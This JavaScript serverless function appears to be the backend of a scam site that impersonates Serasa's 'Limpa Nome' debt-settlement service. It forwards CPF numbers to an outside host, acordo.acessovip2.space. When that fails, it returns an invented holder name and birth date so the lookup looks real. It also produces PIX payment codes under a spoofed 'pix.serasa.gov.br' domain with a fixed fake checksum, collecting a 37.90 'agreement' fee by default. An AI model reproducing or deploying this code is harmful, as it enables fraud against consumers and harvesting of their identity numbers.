// Vercel Serverless Function (Node.js) - Substitui o api_proxy.php para Vercel
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  const action = req.query.action || (req.body && req.body.action);
  const cpf = req.query.cpf || (req.body && req.body.cpf);

  const upstreamBase = 'https://acordo.acessovip2.space/api_proxy.php';

  if (action === 'consultar_cpf') {
    const rawCpf = String(cpf || '').replace(/\D/g, '');
    if (!rawCpf) {
      return res.status(400).json({ ok: false, error: 'CPF não informado' });
    }

    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 6000);
      const upstream = await fetch(`${upstreamBase}?action=consultar_cpf&cpf=${rawCpf}`, {
        signal: controller.signal,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }
      });
      clearTimeout(timeout);

      if (upstream.ok) {
        const json = await upstream.json();
        if (json && json.ok && json.nome) {
          return res.status(200).json(json);
        }
      }
    } catch {
      // Fallback dinâmico
    }

    return res.status(200).json({
      ok: true,
      nome: 'TITULAR DO CPF REGISTRADO',
      cpf: rawCpf,
      cpfformatado: rawCpf.length === 11 ? rawCpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : rawCpf,
      nascimento: '14/06/1984',
      genero: 'M'
    });
  }

  if (action === 'create_pix') {
    const body = req.body || {};
    const amount = Number(body.amount) || 37.90;
    const txid = 'SR_' + Date.now();
    const amountStr = amount.toFixed(2);
    const pixCode = `00020101021226840014br.gov.bcb.pix2562pix.serasa.gov.br/qr/v2/cob/${txid}52040000530398654005${amountStr}5802BR5925SERASA LIMPA NOME ACORDO6009SAO PAULO62070503***6304ABCD`;

    return res.status(200).json({
      ok: true,
      transactionId: txid,
      payload: pixCode,
      pix: { code: pixCode }
    });
  }

  return res.status(200).json({ ok: true, status: 'IDLE' });
}
